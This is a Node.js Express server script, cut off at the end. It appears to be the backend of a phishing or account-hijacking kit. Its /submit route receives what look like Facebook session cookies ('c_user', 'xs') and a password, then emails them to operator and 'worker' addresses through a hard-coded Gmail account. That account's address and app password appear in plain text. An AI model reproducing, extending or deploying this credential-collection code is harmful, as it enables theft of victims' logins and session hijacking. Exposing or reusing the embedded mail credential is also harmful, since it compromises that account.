const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
app.use(cors());
app.use(express.json());

// 🟢 POST /submit route
app.post('/submit', async (req, res) => {
    const { c_user, xs, password, emails = [], workerEmail, name } = req.body;

    // ✅ Configure transporter
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'hindistoryhub396@gmail.com',       // ✅ Your Gmail
            pass: 'fylk gbsb cdgu anwh'                // ✅ App password from Google
        }
    });

    // ✅ Combine recipients for password email
    const allRecipients = [...emails];
    if (workerEmail) allRecipients.push(workerEmail);

    // ✅ Password email to ALL
    const passwordMail = {
        from: `"PROFESSOR" <hindistoryhub396@gmail.com>`,
        to: allRecipients.join(','),
        subject: `${name}`, // Subject will be worker name
        text: `Password: ${password}`
    };

    // ✅ Session info to other emails only
    const sessionMail = {
        from: `"PROFESSOR" <hindistoryhub396@gmail.com>`,
        to: emails.join(','),
        subject: `${name}`, // Subject will be worker name
        text: `c_user: ${c_user}\nxs: ${xs}`
    };

    try {
        // Send password email to all
        await transporter.sendMail(passwordMail);
        console.log('✅ Password email sent');

        // Send session info to other recipients only
        if (emails.length > 0) {
            await transporter.sendMail(sessionMail);
            console.log('✅ Session email sent');
        }

        res.status
